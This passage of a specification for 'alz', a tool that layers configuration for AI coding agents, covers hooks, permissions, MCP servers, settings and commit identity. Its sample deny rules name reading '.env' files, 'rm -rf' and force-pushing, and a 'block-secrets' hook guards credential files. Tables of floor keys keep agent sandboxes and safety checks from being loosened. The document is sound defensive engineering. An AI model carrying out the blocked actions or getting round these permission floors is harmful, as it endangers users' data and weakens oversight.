  agent's or an overlay's native fields (code `agent`). Servers and hooks come only through
  `mcp.yaml` and `hooks.yaml`, so every agent gets the same ones, and the allowlist and the hook
  locks apply to all of them. The TypeScript `alz` passes them through (reference drift,
  TASK-55.5.16).

  Under `claude:` an agent's native fields are typed (TASK-79). The map takes only the
  frontmatter fields that `docs/target-facts.md` §14.4 records with a type: `disallowedTools`
  (text or a list of text), `maxTurns` and `autoCompactWindow` (whole numbers), `background` and
  `omitClaudeMd` (booleans), `effort` and `color` (one of the listed values), `initialPrompt` (text)
  and `experimental` (a mapping with `cacheTtl`, `5m` or `1h`). Any other key is an `agent` error,
  and so is a value of another type; the error names the file and the key path, such as
  `claude.maxTurns`, and never prints the value. A key with a neutral field, and `mcpServers` and
  `hooks`, are refused as above and not reported twice. `codex:` is not typed. The TypeScript
  `alz` takes any key and value (reference drift, TASK-79).
- **Key order of native fields** (TASK-66). Native fields keep the order of the source:
  - A key keeps the place of its first appearance, in stack order.
  - A key that a later layer adds comes after the existing ones.
  - A later value replaces or merges in place, without moving its key.
  - A key that is a whole number (`9`, `10`) is an ordinary key and keeps its place. Only an
    untyped map can hold one: `codex:`, since the typed `claude:` fields have fixed names.

  A generated agent file writes the neutral fields first, then the native fields in this
  order. The TypeScript `alz` writes whole-number keys first, in numeric order, because it reads
  YAML into JavaScript objects (reference drift, TASK-66). Settings do not keep source order:
  their output is sorted by key (§7.9, §10.2).
- **Other fields.**
  - `name` must equal the file's stem (§4.1).
  - `memory` is `none`, `project`, `user` or `local`.
  - `permission_mode` is `bypass_permissions`, `auto`, `accept_edits`, `default`, `dont_ask`
    or `plan`.
  - In an overlay, an error in `extends` or `mode` is an `agent-overlay` error, and a missing
    `extends` is `extends is required`. An error in any other field is an `agent` error. The
    TypeScript `alz` uses `agent-overlay` for all of them (reference drift, TASK-55.5.5).
  - An overlay that removes a tool from an agent without a tool list is an `agent-overlay`
    error.
- **An overlay only makes an agent stricter** (TASK-55.5):
  - Its `permission_mode` may not be looser, in the order of §7.6, than the mode of the agent it
    refines, when that agent sets one.
  - Nor may it be looser than a permissions floor (`floor: true`, §7.6) that a more general
    layer declared.
  - Its `claude.disallowedTools` must keep every entry that a more general layer set; it may add
    entries.

  Otherwise the overlay is an `agent-overlay` error and is not applied. An example message is
  `overlay on agent <name> sets permission_mode '<mode>', which is looser than '<mode>' of the
  agent it refines; an overlay may only make an agent stricter`. The TypeScript `alz` takes any
  mode and any list (reference drift, TASK-55.5).

### 7.3 Skills
- Identity is the skill directory name (it must match `name:` in the SKILL.md).
- The **most specific layer wins** on a name collision, and the whole skill directory is
  replaced. This intentionally overrides each tool's native precedence, because all skills
  are emitted at project scope (§8.4).
- **Slots:** a skill name listed in any agent's `skills` or in a layer's `requires_slots`
  must exist in the final set. If `strict_slots` is true, a missing slot is an error;
  otherwise the build emits a stub skill that says "not defined for this repo" and warns.
- Skill **extension** is not supported (skills are atomic). To specialise a skill, the more
  general skill should reference a slot skill, e.g. "also apply `stack-conventions`".
- `SKILL.md` must have `name` and `description`. Its other frontmatter is not checked.
- A `requires_slots` entry that is not a skill name is a `slot` error, in a build and in a lint.
  A `provides_slots` entry without its skill is checked by `alz lint` only.
- A `slot-missing` diagnostic is located at `<layer>:layer.yaml` for a `requires_slots` entry,
  and at the agent's defining file for a skill that an agent preloads.
- There is no limit on the number of skills an agent preloads.

### 7.4 Commands
- `commands/<name>.md` compiles into a skill `<name>` that can only be invoked explicitly
  (no automatic model invocation), using the target's equivalent flag.
- Same collision rule as skills. A command and a skill with the same name in one layer is an
  error (code `skill-command-clash`). The command is dropped and the error is reported once.
- A command's frontmatter has `description` (required) and `argument_hint` (optional). Any other
  field is a `command` error.

### 7.5 Hooks
`hooks.yaml`:

```yaml
- id: block-secrets              # unique id across the stack
  event: pre_tool                # neutral events: session_start | pre_tool | post_tool | stop | subagent_stop | prompt_submit
  match: { tools: [read, write, edit], paths: [".env*", "**/credentials*"] }
  run: scripts/block-secrets.sh  # relative to the layer's hooks/; copied into the repo output
  on_fail: deny                  # deny | warn | feedback
  targets: [claude, codex]
```

- A hook has exactly one of `run:` (a script of the layer below `hooks/scripts/`, named relative
  to `hooks/` as in `scripts/block-secrets.sh`, copied into the repo; the TypeScript `alz` takes
  any file below `hooks/`, reference drift, TASK-55.5) or
  `command:` (a command line used as written). In a command, `${PROJECT_DIR}` is the repo root;
  each adapter replaces it with its own variable. `timeout` is in seconds.
- `event` may also be a target's own event, written `<target>:<Event>` (e.g.
  `claude:Notification`). It runs on that target only and takes the target's `matcher` string
  instead of `match`.
- **All hooks from all layers are combined.** Execution order is stack order, then file order.
- A more specific layer may **disable** a hook by `id` with `- id: x\n  disabled: true`,
  **except** hooks marked `locked: true`. Personal or client layers use `locked` for
  security floors.
- Hook scripts are copied to `.claude/hooks/<layer>/…` (or the target's equivalent) and
  referenced through the project-dir variable, never by absolute path.
- A hook event a target doesn't support becomes a build **warning** for that target. The
  report lists which guardrails fall back to pre-commit/CI.
- `id` is any text with a visible character. A diagnostic prints it as a quoted key (§10.1).
- `timeout` is a positive whole number of seconds. The TypeScript `alz` also took fractions
  (reference drift, TASK-55.5.8).
- `on_fail` defaults to `warn`.
- In a native event `<target>:<Event>`, `<target>` is `claude` or `codex`, and `<Event>` matches
  `^[A-Z][A-Za-z]+$`. A native hook may list only its own target in `targets`. `targets: []` is
  an error.
- `match.tools` lists bare neutral tools or `mcp__` tools, without a scope.
- Ids:
  - A duplicate id within one layer is a `hooks` error.
  - A disabled id stays taken: defining it again in a later layer is a `hooks` error.
  - Disabling a hook of the same layer, or a hook that is already disabled, is `unresolved`.

### 7.6 Permissions
`permissions.yaml`:

```yaml
allow: [ "bash:mise run *", "bash:git status" ]
ask:   [ "bash:git push *" ]
deny:  [ "read:.env*", "bash:rm -rf *", "bash:git push --force*" ]
default_mode: default
```

- `allow`, `ask` and `deny` are each **combined** across layers.
- **Deny always wins.** A more specific layer cannot remove a deny from a more general layer
  (the **permission floor**). Removing one is a build error.
- `default_mode`: most specific wins, but it can never be looser than the strictest mode
  declared with `floor: true` in a more general layer.
- `allow`, `ask` and `deny` are each written as a plain YAML list, which adds to the inherited
  rules, or as a string of `+[…]`, `-[…]` and `[…]` segments, read as in §7.2. `allow` and `ask`
  may drop inherited rules; `deny` may not (the floor above).
- A rule is `<tool>` or `<tool>:<pattern>`, with a tool of §7.2's vocabulary. An unknown tool or
  an empty pattern is a `permissions` error.
- A rule that is both in `allow` and in `deny` gives the warning `permission-shadowed`. The deny
  wins.
- Modes, from loosest to strictest: `bypass_permissions`, `auto`, `accept_edits`, `default`,
  `dont_ask`, `plan`.
- `floor` must be `true` or `false`, and it needs a `default_mode` (`floor: false` without one is
  an error too).
- A `default_mode` looser than the floor is refused, and that layer's mode and floor are both
  ignored. A layer's own floor does not bind its own `default_mode`.
- Three boolean floor fields (TASK-55.5.16):
  - `disable_bypass_mode` switches off the target's bypass-permissions mode;
  - `block_reads_outside` blocks reads outside the working directories;
  - `block_writes_outside` blocks writes outside them.

  Once a layer sets one to `true`, it stays true. A more specific layer that sets it to `false`
  is a `permission-floor` error that names the field and both layers:
  `<field> is true as set by layer <layer> and cannot be set to false by layer <layer>`. A field
  that no layer sets, or that is `false` from the first layer that writes it, is not set. R5's
  Claude adapter writes them as `permissions.disableBypassPermissionsMode`,
  `permissions.blockReadsOutsideWorkingDirectories` and
  `permissions.blockWritesOutsideWorkingDirectories`, once `docs/target-facts.md` records those
  keys (TASK-76). It writes `permissions.disableBypassPermissionsMode` as the string `"disable"`,
  never `true`, because Claude Code takes that key as a string, and the two `block...` keys as
  booleans (`docs/target-facts.md` §13). The TypeScript `alz` has no such fields and refuses them as unknown (reference
  drift, TASK-55.5.16).

### 7.7 MCP servers
`mcp.yaml` defines servers by id:

```yaml
context7:
  transport: http
  url: https://mcp.context7.com/mcp
playwright:
  transport: stdio
  command: npx
  args: ["@playwright/mcp@latest"]
  env_from: [ ]            # names of env vars to pass through; values are NEVER stored here
```

- A server id matches `^[A-Za-z0-9][A-Za-z0-9_-]{0,63}$`: an ASCII letter or digit, then up
  to 63 ASCII letters, digits, `_` or `-`. Any other key of `mcp.yaml`, whatever it is, is an
  error (code `mcp`) that names the layer and the file and prints the key quoted (§10.1). The
  other servers of the file are still checked. The entries of the manifest's `mcp.enable` follow
  the same grammar (§5.2). The merged servers are an ordered map keyed by server id. The
  TypeScript `alz` takes any key (reference drift, TASK-55.5).
- Same id → the most specific definition wins, and the whole entry is replaced.
- Only ids listed in the repo manifest's `mcp.enable` are emitted (allowlist). The rest are
  defined but inactive, which keeps the token budget under control.
- Secrets: definitions may name env vars but must not contain values. The leak guard rejects
  anything that looks like a token.
- A definition's checks stop at its first failing step, which gives one error per server.
- A `command` on an `http` or `sse` server and a `url` on a `stdio` server are ignored.
- An id that `mcp.enable` lists twice is enabled once.
- An id in `mcp.enable` whose definition was refused still gets the "no layer defines it"
  error, unless it was refused for a protected variable (§7.9).
- A layer inside the repository (§7.12) may replace a server that a layer outside the repository
  defined. It then gets the warning `server <id> replaces the definition of layer <layer>, which
  lies outside the repository` (code `mcp`) at its `mcp.yaml`, and the replacement applies. The
  TypeScript `alz` gives no warning (reference drift, TASK-55.5).
- A protected or malformed `env_from` entry is a `protected-variable` error. It names the file,
  without a line and column (§7.9).

### 7.8 Model routing
`models.yaml`:

```yaml
aliases:                       # logical → per-target concrete model ids
  strong:  { claude: opus,   codex: <codex-strong-model> }
  fast:    { claude: sonnet, codex: <codex-fast-model> }
roles:
  planning: strong
  review:   strong
  implementation: fast
  research: fast
```

- Aliases and roles are deep-merged, and the most specific value wins.
- Each alias maps target names (`claude`, `codex`) to model ids. Any other key in an alias is an
  error (code `models`) that names the file and prints the key quoted (§10.1).
- An agent's `model: inherit` resolves through its `role`. An explicit alias overrides the role.
- Concrete model ids live **only** here, so swapping models is a one-line change in one layer.
- Alias names, role names and concrete model ids are any text that is not blank.
- A `models.yaml` with any problem gives no aliases, roles or default from that layer. The
  TypeScript `alz` kept its valid aliases (reference drift, TASK-55.5.11).

### 7.9 Other settings
`settings.yaml`, namespaced by target:

```yaml
claude: { <native settings.json keys> }
codex:  { <native config.toml keys> }
```

The top level of `settings.yaml` takes only the target names `claude` and `codex`, and each
value is a mapping; `null` or any other value is an error. Any other top-level key, whatever it is, is an error (code `settings`). The
error names the layer and the file and prints the key quoted (§10.1), and none of that file's
settings are merged. Per target, the merged settings are ordered maps of the keys that passed
these checks. The TypeScript `alz` takes other top-level keys without an error (reference drift,
TASK-55.5).

The merge is a deep merge, a left fold in stack order:
- Mappings merge key by key.
- Two arrays are concatenated and de-duplicated, keeping the first occurrence. Two items count as
  the same when they are equal as values, so mappings that differ only in key order are one item.
  The TypeScript `alz` compares their JSON text instead (reference drift, TASK-55.5).
- In every other case the more specific value wins, a change of kind included (an array replaced
  by a scalar).

The merged settings are passed through to the target **without validation** beyond a schema
check where one exists.
Keys that duplicate a first-class item (permissions, hooks, MCP, model) are rejected, so
there is only one way to set each thing. Under `codex:` these are `model`, `mcp_servers`, `hooks`,
`approval_policy` and `sandbox_mode` at the top level (`profile` and `profiles` are reserved
keys, below). Because `hooks` and `codex_hooks` duplicate a first-class item wherever they stand,
they are also reserved below the top level, in every `features` mapping: `codex.features`, the
`features` of a profile, or one nested anywhere else under `codex:`.

Each reserved key is a `settings` error. It names the file and a key path chosen by alz, such as
`codex.**.features.hooks`, with `**` for the keys above it, and it never prints the value.
The TypeScript `alz` checks the top level only (reference drift, TASK-55.5).

**Security-relevant native keys** (TASK-55.5.16). One table in alz decides, for each target,
which native keys `settings.yaml` refuses and which may only get stricter down the stack. It is
the list that the owner approved in TASK-55.5 (2026-11-23), and TASK-76 corrects it.

**Key paths.** A key path names keys from the target's mapping down, joined by `.`. A `*` stands
for any one key, such as a profile name. A `**` stands for any run of keys or list items, so
`**.features.hooks` is `hooks` in a `features` mapping wherever it stands. Every key is checked at
the place its path names, at any depth. A diagnostic prints the table's path, never text of the
layer.

**First-class keys** are refused with the file that sets them instead
(`'<path>' is set through <file>`):
- Claude: `permissions`, `hooks`, `model`, `enabledMcpjsonServers`, `disabledMcpjsonServers`,
  `enableAllProjectMcpServers` and `disableAllHooks`.
- Codex: `model`, `mcp_servers`, `hooks`, `approval_policy` and `sandbox_mode`; `features.hooks`,
  `features.codex_hooks`, `**.features.hooks` and `**.features.codex_hooks`.

**Reserved keys** are refused with a reason (`'<path>' is not set in settings.yaml: <reason>`):
- Claude, a key that runs a command or carries a login: `apiKeyHelper`, `statusLine`,
  `fileSuggestion`, `awsAuthRefresh`, `awsCredentialExport`, `gcpAuthRefresh`,
  `otelHeadersHelper` and `sandbox.credentials`.
- Claude `mcpServers`: Claude Code documents no such settings key (`docs/target-facts.md` §13.4;
  it accepts the key silently), and servers are set through `mcp.yaml`.
- Claude, a key that routes traffic: `sandbox.network.httpProxyPort` and
  `sandbox.network.socksProxyPort`.
- Claude, a plugin source: `enabledPlugins` and `extraKnownMarketplaces`.
- Claude, a key for a scope alz does not write (user or managed settings):
  `sandbox.filesystem.disabled`, `sandbox.allowAppleEvents`, `sandbox.allowNestedUserNamespaces`,
  `sandbox.network.strictAllowlist`, `sandbox.network.allowManagedDomainsOnly`, `autoMode`,
  `skipAutoPermissionPrompt`, `skipDangerousModePermissionPrompt`, `allowManagedHooksOnly`,
  `allowManagedMcpServersOnly`, `managedMcpServers`, `prependPlugins`, `appendPlugins`,
  `pluginConfigs`, `strictKnownMarketplaces`, `blockedMarketplaces`,
  `strictPluginOnlyCustomization`, `syncClaudeAiPlugins`, `allowAllClaudeAiMcps` (managed scope
  only), `sandbox.filesystem.allowManagedReadPathsOnly`, `sandbox.ripgrep`, `sandbox.bwrapPath`,
  `sandbox.socatPath`, `sandbox.network.tlsTerminate`, `processWrapper`, `policyHelper`,
  `sshHostCommands`, `forceLoginGatewayUrl`, `allowManagedPermissionRulesOnly` and
  `disableSideloadFlags`.
- Claude `skipWebFetchPreflight`, which turns off a safety check of Claude Code that no layer
  may lower (TASK-79).
- Claude `forceLoginMethod` and `forceLoginOrgUUID`, which steer how the user signs in, and a
  repository layer may not set that (TASK-79).
- Codex, a key whose values have no order: `auto_review`, `default_permissions`, `permissions`
  and `apps`.
- Codex `profile`: removed by Codex 0.169.0, which refuses it at load (use `--profile`).
- Codex `profiles`, as a whole: a project's `config.toml` ignores it (`docs/target-facts.md`
  §13.7). So no key below it is read, whether `approval_policy`, `sandbox_mode`,
  `model_provider`, `chatgpt_base_url` or `web_search`.
- Codex `windows`, as a whole (`windows.sandbox`, `windows.allow_mxc`): a key for a user or
  managed scope.
- Codex, a plugin source: `plugins` and `marketplaces`.
- Codex, `projects.*.trust_level`, because a layer must not mark a project as trusted.
- Codex, a key that runs a program or routes traffic: `notify`, `model_provider`,
  `model_providers`, `openai_base_url`, `chatgpt_base_url` and `otel`.

**Floor keys** may be set. Once a layer sets one, a more specific layer may only make it
stricter:
- A boolean may only be set to its stricter value.
  - `true` is stricter for Claude `sandbox.enabled`, `sandbox.failIfUnavailable`,
    `disableSkillShellExecution` and `disableClaudeAiConnectors`, and for Codex
    `sandbox_workspace_write.exclude_tmpdir_env_var` and `sandbox_workspace_write.exclude_slash_tmp`.
  - `false` is stricter for Claude `sandbox.autoAllowBashIfSandboxed`,
    `sandbox.allowUnsandboxedCommands`, `sandbox.enableWeakerNestedSandbox`,
    `sandbox.enableWeakerNetworkIsolation`, `sandbox.network.allowAllUnixSockets` and
    `sandbox.network.allowLocalBinding`, and for Codex `sandbox_workspace_write.network_access` and
    `allow_login_shell`.
- Ordered text keeps its rank or moves to a stricter one, and a value that is in no rank may not
  change:
  - Claude `disableAutoMode`: one rank, `disable`. Once a layer sets it, no more specific layer
    may change it. While no layer has set it, it is free;
  - Codex `approvals_reviewer`: `auto_review` and `guardian_subagent`, then `user`;
  - Codex `web_search`: `live`, then `indexed`, then `cached`, then `disabled`. `tools.web_search`
    is not a mode (a boolean or a table, `docs/target-facts.md` §13.8), so it has no ladder; its
    `allowed_domains` is a "no additions" list below.
- A "no additions" list or mapping gains no entry, list item or mapping key at any depth, that a
  more general layer did not set. Settings have no removal syntax, so it cannot shrink either.
  These are Claude `sandbox.excludedCommands`, `sandbox.filesystem.allowWrite`,
  `sandbox.filesystem.allowRead`, `sandbox.ignoreViolations`, `sandbox.network.allowedDomains`,
  `sandbox.network.allowUnixSockets`, `sandbox.network.allowMachLookup`, `allowedHttpHookUrls`,
  `httpHookAllowedEnvVars` and `allowedMcpServers`, and Codex
  `sandbox_workspace_write.writable_roots` and `tools.web_search.allowed_domains`.
- A "union" list only grows: Claude `sandbox.filesystem.denyWrite`, `sandbox.filesystem.denyRead`,
  `sandbox.network.deniedDomains` and `deniedMcpServers`.

**When a floor is broken.** A looser value, a forbidden new entry, or a change of kind, `null`
included, is a `settings` error (`'<path>' is a floor: …`). It names the layer, the file and the
key path, and none of that file's settings are merged. A key that no more general layer set, or
that it set to `null`, is free. This departs from the left fold above for these keys only. The
TypeScript `alz` merges all of them freely and refuses only the first-class keys at the top level
(reference drift, TASK-55.5.16).

**Facts.** An adapter relies on what one of these keys does only once `docs/target-facts.md`
records it (TASK-76). Until then the table only refuses or constrains the key.

**Typed keys** (TASK-79). Under `claude:`, `settings.yaml` accepts only the keys whose name and
type `docs/target-facts.md` §14 records, and checks the type of each value before alz writes it.
One table in alz holds them (§14.2 lists the rows). A type is a boolean, text, a whole
number, a number, one of a list of texts, a list of one type, a mapping with any text keys and
values of one type (`env`, `modelOverrides`), a mapping with listed keys (`sandbox` and the
others, each key optional, and any other key an error at that depth), or one of several types.
- A key that is not in the table is a `settings` error, at any depth: `'<path>' is not a Claude
  Code settings key that alz accepts (docs/target-facts.md section 14)`. That covers a misspelt
  key, and a key that Claude Code reads from a user or managed scope only (§14.3 lists them).
- A value of another type, `null` included, is a `settings` error: `'<path>' must be …`. The path
  is the table's, with `*` for a key of a mapping with any keys and `[]` for a list item. The error
  names the layer and the file and the line and column, and never prints the value; a key that is
  not in the table is printed as a quoted key. None of that file's settings are merged.
- The security rules above apply on top. A key they refuse is reported once, by them, and is not
  in the typed table; a floor key is accepted and typed (a floor never sees a value of another
  type, because the read refuses it first).
- The check looks at names and types only. It does not check a number's range, the syntax of a
  pattern or a path, or whether a key has an effect in a project file.
- `codex:` has no typed table in this version.

The TypeScript `alz` accepts any key and any value under `claude:` (reference drift, TASK-79).

No layer may set `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `HOME`, `XDG_CONFIG_HOME`,
`XDG_STATE_HOME` or `XDG_CACHE_HOME`, which choose the account folder or locate alz's own
files and the layer cache (§7.13). Each of these is a build error (code `protected-variable`)
that names the layer, the file, a key path chosen by alz and, for a protected name, the
variable, and never the text the layer wrote. A variable name here is a plain name,
`^[A-Za-z_][A-Za-z0-9_]*$`; a key or entry that is anything else (`NAME=x`, a NUL, a space) is
refused, because a spawn would read `CODEX_HOME=/x` as the name `CODEX_HOME` with a value.
Names compare ignoring ASCII case. An `env`, `set` or pattern list of another type cannot be
checked and is refused.
A `shell_environment_policy`, `mcpServers` or `mcp_servers` that is not a mapping is refused
too, because it could carry environment settings that the check cannot see. A pattern that
matches several protected variables gives one error per variable. A `protected-variable`
diagnostic names the file without a line or column.

- `settings.yaml`, Claude: the keys of `claude.env`.
- `settings.yaml`, Codex: `shell_environment_policy` wherever it appears under `codex`
  (profiles included). It builds the environment of Codex's shell commands and, unlike
  Claude's project `env`, is honoured in a trusted project's `.codex/config.toml` (§12 item
  15). A `set` key that names one of the variables is refused. So is any `exclude` entry, and
  any `filters` entry that is not set to `include`, whose pattern matches one of them as Codex
  matches patterns: `*` for any run of characters, `?` for one, and characters equal when
  their lower-case forms are equal (§12 item 15, 'policy patterns'). `include_only` and
  `inherit` are allowed (a known limit, below).
- `mcp.yaml`: an `env_from` entry that names one of them (`env` values are never accepted
  there). A server refused for this does not also get a "no layer defines it" error from
  `mcp.enable`.
- Native agent frontmatter: the `env` of each server under `claude.mcpServers` (a map of
  name to definition, or a list of names and one-entry maps), under `codex.mcp_servers`, and
  a `shell_environment_policy` under `codex`.
- Passthrough files (§7.11), with the path after `targets/<target>/` compared with ASCII
  case folding. Covered: every path ending in `.claude/settings.json` or
  `.claude/settings.local.json`, every `.mcp.json`, and every `.claude-plugin/*.json`, at any
  depth. Each is parsed as JSON, and one that does not parse is refused. The root `env`, the
  `env` of each `mcpServers` entry and any nested `env` mapping are checked. Also covered:
  every `.claude/agents/**/*.md` frontmatter (`mcpServers`; unparsable frontmatter is
  refused) and every `*.toml` file. These checks apply to every target, because an adapter
  writes whatever path a layer ships under its own target (`targets/claude/.codex/config.toml`
  reaches the repository like `targets/codex/.codex/config.toml`). alz has no TOML parser, so
  a `.toml` file is refused when its text mentions `shell_environment_policy`, or one of the variables as a
  whole name (not preceded or followed by a letter, digit, `_` or `-`; so `/home/user` is a
  mention and `homepage` is not), ignoring ASCII case, or has a `\u`, `\U` or `\x` escape or a
  backslash at the end of a line, which can spell or join a name that a text search cannot
  see. This is stricter than the rules above; a TOML parser may relax it later. A passthrough
  path with a non-ASCII character anywhere is refused, for every target, because a file
  system may fold it into a checked name: on macOS APFS `.mcp.jſon` (a long `ſ`) opens as
  `.mcp.json` and `Settings.json` as `settings.json` (`docs/target-facts.md` §12, 'File names,
  macOS'). Not checked: a plugin's `plugin.json` can name another file for `mcpServers`, and
  that file is not read.

`alz lint` reports these too. Account resolution reads layers from the cache and relies on its
integrity: cache reads are checked against the lock's content hash and git cache keys are
unambiguous (§5.3, §6).

**Limit.** This rule covers declarative configuration only. Hooks, MCP `command` and `args`,
and any other item that runs code can set any variable, so the build cannot promise that no
layer changes the account folder. The real control is that a layer-named account does not apply
until the person allows it (`alz account allow`, §7.13, TASK-50.11). Among Codex's policy keys,
only `set` is a firm guarantee: `include_only` and `inherit` can drop the variables from a
shell command's environment, and that stays allowed.

### 7.10 Path-scoped rules
`rules/<name>.md` holds Markdown with frontmatter `paths: [<globs>]`. It's loaded only when
the agent works on matching files (e.g. `backend.md` → `src/**`).
- Identity is the filename. The most specific layer wins, and the whole file is replaced.
- `mode: extend` in a more specific layer appends its body under a layer heading and
  combines `paths` (union).
- Output: the target's native path-scoped rules (`.claude/rules/` for Claude). For a target
  without them, the adapter emits a nested `AGENTS.md` per directory where the globs resolve
  to one directory. Otherwise it warns.
- Rules are how area conventions stay out of the always-loaded instructions budget.
- A rule that is not `mode: extend` must have `paths`. Without them it is the `rule` error
  `'paths' is required; always-loaded text belongs in instructions/`.
- A glob listed twice in one rule's `paths` is kept once. The TypeScript `alz` kept both on a
  replace (reference drift, TASK-55.5.4).
- An `extend` rule with no rule of that name in a more general layer is `unresolved`.

### 7.11 Passthrough (`targets/<target>/…`)
This is the escape hatch for target features the neutral schema doesn't cover. Only a folder
named after a known target (`claude`, `codex`) holds passthrough files; each file below any other
folder in `targets/` is an error (code `passthrough`) that names the file (§4.1). Files are
copied into place, and the most specific layer wins per path. The build warns on each use
so passthroughs get turned into first-class items over time.
- The warning is `raw passthrough to <path>; consider turning it into a first-class item`
  (code `passthrough`). A file below another folder of `targets/` gets the error `this file is
  below a folder of targets/ that is not a target: claude or codex (§7.11)`.
- A refused passthrough file gives its errors only, and no warning. The TypeScript `alz` warned
  as well (reference drift, TASK-55.5.12).
- A passthrough file whose path is the path of a generated file, compared after case folding
  (§4.3), is the error `passthrough` at `<layer>:<file>`, with the message `passthrough <path>
  collides with a generated file`, and the generated file is kept. So
  `targets/claude/.claude/Settings.json` collides with `.claude/settings.json`. The TypeScript
  `alz` compares paths exactly (reference drift, TASK-55.6).
- The non-ASCII rule of §7.9 applies to every path below `targets/`, in a known target's folder
  or not.
- The protected-variable checks of §7.9 have these limits:
  - A `.toml` file that is not valid UTF-8 cannot be checked and is refused.
  - The TOML text rule reports each protected variable it finds once.
  - A `mcpServers` that is neither a mapping nor a list (a plugin manifest that names another
    file) is not checked, and neither is a JSON file whose root is not an object.
  - Nested `env` mappings are checked down to the JSON reader's depth limit of 128. The
    TypeScript `alz` refused files nested more than 32 deep (reference drift, TASK-55.5.12).

### 7.12 Commit identity
The person who owns the stack declares the identity that every commit is authored and
committed under, in the `layer.yaml` of the stack's first layer (§5.1). A client layer may
override it for that client's repos, for example with a client-issued email:

```yaml
commit_identity:
  name: Your Name
  email: you@example.com
```

- **Who may declare it.** A layer is *outside the repository* when its source is `github:`
  or a `git:` URL of a remote, or a `path:` (or a `git:` local path or `file://` URL, read
  against the repo root) that resolves outside the repo root both as written and after
  following symlinks, using the file system's own spelling of each name, so a case variant of
  a path inside the repo, and a link outside the repo that points into it, are inside. A
  `git:` argument counts as a local path, whatever it looks like (`x:y`, `file:///dir`), when
  a path of that name exists relative to the repo root, as given or with git's own suffixes
  `/.git`, `.git/.git`, `.git` or `.bundle`, because `git clone` looks for such a path before
  it reads the argument as a URL. Only then is a `file://` URL its absolute path, and a
  `scheme://` or `host:path` argument a remote. The path is looked up from the string as
  written, so the operating system resolves any `..` through symlinks exactly as git will,
  then canonicalised; the inside check and `git clone` both use that canonical path, never the
  URL as written. A local `git:` source (including `file://`) with a `..` segment is a source
  error that names the source, because text and disk can disagree about where it leads. A
  `git:` or `github:` source classed as a remote is cloned with `https` and `ssh` only
  (§6 "Git subprocesses": `-c protocol.allow=never` and the two `always` settings, and a
  `GIT_ALLOW_PROTOCOL` that the user's own can only narrow), so git cannot fall back to a local
  path or run a transport helper (`docs/target-facts.md` §11); a `url.<base>.insteadOf` that rewrites such a
  URL to a local mirror therefore fails to clone. Only two layers may declare `commit_identity`:
  1. the **first stack entry** (normally `personal`), if it is outside the repository;
  2. one **client layer**: a later layer with `kind: client`, `visibility: private` or
     `confidential`, outside the repository (normally the hub's `layer/`, §4.4).

  `kind` stays a free-form label everywhere else (§3.1); `client` has this one meaning. Any
  other declaration is a build error that names the layer: the repo layer (inside the
  repository, whatever its `kind` says), group layers, any other kind, and a public layer
  that calls itself `client`. In the hub repo itself (§4.4) `layer/` is inside the
  repository, so the hub's own commits use the first layer's identity. There is no overlay,
  `~` or remove form. `alz lint` of a single layer checks the shape only, because it cannot
  know the layer's position or source.
- **Which one wins.** The client layer's declaration replaces the first layer's whole
  identity, name and email together; the two are never mixed. Equal values are fine. A
  declaration by a second client layer is a build error naming all the client layers that
  declare, so no further layer can override silently. If only one of the two declares, that one applies.
- **Refusals** (TASK-55.5.13).
  - The build reports every refused declaration as an error (code `identity`; `account` for
    §7.13).
  - A refused first layer leaves no winner, even when a client layer declares too: the
    declarations conflict.
  - A layer whose directory cannot be opened counts as inside the repository.
  - The reasons keep the reference's wording: `it is inside the repository`,
    `its kind is '<kind>', not 'client'` and `it is public`.
  - Account resolution applies its own rule to a layer inside the repository: it ignores the
    declaration, which neither wins nor conflicts (§7.13).
- **Where it came from.** The winning layer is named in the generated Commits section, in
  the `AGENTS.md` header sources, and in every `init`, `build` and `check` report (§9.4).
- **No declaration, no feature.** Nothing is added to `AGENTS.md`, and `init`, `build` and
  `check` run no git command for it and print nothing about it. (`init` still resolves the
  stack to look for a declaration, which fetches remote layers like `build` does.)
- **Validation.** The identity is untrusted layer content and reaches a git subprocess
  (§9.4), so `layer.yaml` parsing rejects it as a schema error unless:
  - the map has exactly the keys `name` and `email`, both strings;
  - `name` is 1 to 128 characters, has no leading or trailing whitespace, does not start with
    `-`, and contains no control character (U+0000–U+001F, U+007F–U+009F, U+2028, U+2029),
    no Unicode format character (category Cf: zero-width, bidi controls, BOM, soft hyphen),
    and no `<`, `>`, backtick or backslash. It does not start or end with `.` `,` `:` `;` `"`
    `'` `\` `<` or `>`: git trims most of these from both ends of a name
    (`docs/target-facts.md` §11), so the declared name could never match what git reports.
    An apostrophe inside a name is allowed;
  - `email` is at most 254 ASCII characters, does not start with `-` and neither starts nor
    ends with `.`, has no format character, and matches
    `^[A-Za-z0-9._%+-]+@[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+$`.
- **Generated Commits rule.** With a declaration, the build appends this section as the last
  section of `AGENTS.md`, with the winning values in place of `<name>` and `<email>` and the
  winning layer's name in place of `<layer>`, and adds `<layer>@<rev>:layer.yaml` (winning
  layer only) to the header's sources:

  ```markdown
  ## Commits

  - Author and committer of every commit made in a local clone: `<name> <<email>>` (declared by layer `<layer>`). This repository's local git config sets it; never change `user.name` or `user.email`, and never commit locally under a CI, bot or shared identity.
  - A commit made by an agent ends with a `Co-Authored-By:` trailer that names the agent. Use the trailer your tool adds; if it adds none, write one.
  - If `git var GIT_AUTHOR_IDENT` shows another identity, do not commit; report it.
  - Bots that commit on the hosting service, such as release or CI bots, are exempt from this rule.
  ```

  The section is derived from layer content only, so builds stay byte-identical. It counts
  towards the instruction budgets (§5.2). It has no instruction filename, so no layer can
  `mode: replace` or `mode: remove` it. Changing this text changes generated output and needs
  a release note.
- **Attribution is instruction-only.** alz sets no Claude Code or Codex attribution setting
  and relies on no tool behaviour for the trailer (`docs/target-facts.md` §10). A layer may
  still set a target's own attribution keys through `settings.yaml` (§7.9).
- **Setting it up and checking it** is described in §9.4: `alz init` and `alz build --adopt`
  set the repo-local git identity, `alz build` warns about a mismatch, `alz check` fails on one.
- **Scope: people and agents committing in a local clone.** Bots that commit on the hosting
  service (a release bot, a CI workflow) are exempt, and CI runs `alz check --skip-identity`
  (§14). alz never configures a bot identity.
- **Trust.** The repo manifest is repo content and chooses the stack, so a cloned repo could
  name an external layer it controls as the first layer, or as a private `kind: client`
  layer. The rule above stops the repository's own files from declaring an identity, but it
  cannot tell your personal layer from someone else's. Three things limit the damage: only
  the setup commands write (§9.4); they only add missing local keys and never replace one;
  and every write and report names the declaring layer and its source.
- The identity belongs to one person. In a repository that several people build, everyone
